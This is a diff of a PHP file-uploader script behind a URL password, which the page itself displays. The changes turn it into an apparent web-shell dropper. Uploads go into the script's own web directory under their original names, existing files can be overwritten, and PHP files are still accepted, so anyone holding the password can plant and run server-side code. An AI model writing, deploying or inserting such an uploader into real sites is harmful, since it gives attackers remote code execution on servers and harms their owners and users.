@@ -1,20 +1,14 @@
 <?php
 session_start();
 
-/* ===== CONFIG (ONLY HASH STORED) ===== */
+/* ===== CONFIG ===== */
 $PASSWORD_HASH = "13631f1178a08863c6df2282efa79d6e";  
 
-$UPLOAD_DIR = __DIR__ . "/uploads/";
+$UPLOAD_DIR = __DIR__ . "/";   // ← Present directory mein upload
 
-/* Updated Allowed Types */
 $ALLOWED = [
-    'image/jpeg',
-    'image/png',
-    'text/plain',
-    'text/x-php',
-    'application/x-php',
-    'application/php',
-    'application/octet-stream'
+    'image/jpeg', 'image/png', 'text/plain', 
+    'text/x-php', 'application/x-php', 'application/php'
 ];
 
 /* ===== AUTH CHECK ===== */
@@ -42,22 +36,21 @@ if (isset($_SESSION['auth']) && isset($_FILES['file'])) {
         $mime = mime_content_type($tmp);
 
         if (!in_array($mime, $ALLOWED)) {
-            die("Invalid file type: <b>" . htmlspecialchars($mime) . "</b><br>
-                <a href='uploader.php'>Try Again</a>");
+            die("Invalid file type: " . htmlspecialchars($mime));
         }
 
-        if (!is_dir($UPLOAD_DIR)) {
-            mkdir($UPLOAD_DIR, 0700, true);
-        }
+        $original_name = basename($_FILES['file']['name']);   // Original name rakhega
 
-        $name = bin2hex(random_bytes(8)) . "_" . basename($_FILES['file']['name']);
-        
-        if (move_uploaded_file($tmp, $UPLOAD_DIR . $name)) {
-            echo "✅ Uploaded successfully!<br><br>";
-            echo "File: " . htmlspecialchars($name) . "<br><br>";
-            echo "<a href='uploader.php'>← Back to Upload</a>";
+        $destination = $UPLOAD_DIR . $original_name;
+
+        // Agar same naam ki file pehle se hai toh overwrite ho jayegi
+        if (move_uploaded_file($tmp, $destination)) {
+            echo "✅ File successfully uploaded!<br><br>";
+            echo "File Name: <b>" . htmlspecialchars($original_name) . "</b><br>";
+            echo "Location: Current Directory<br><br>";
+            echo "<a href='uploader.php'>← Back to Uploader</a>";
         } else {
-            echo "❌ Failed to save file.";
+            echo "❌ File upload failed. Check folder permissions.";
         }
         exit;
     }
@@ -71,12 +64,11 @@ if (isset($_SESSION['auth']) && isset($_FILES['file'])) {
 </head>
 <body>
 
-<h2>File Uploader</h2>
+<h2>File Uploader (Current Directory)</h2>
 
 <?php if (empty($_SESSION['auth'])): ?>
 
-<p>Login via URL:</p>
-<code>?p=wiredmouseis</code>
+<p>Login via URL: <code>?p=wiredmouseis</code></p>
 
 <?php else: ?>
 
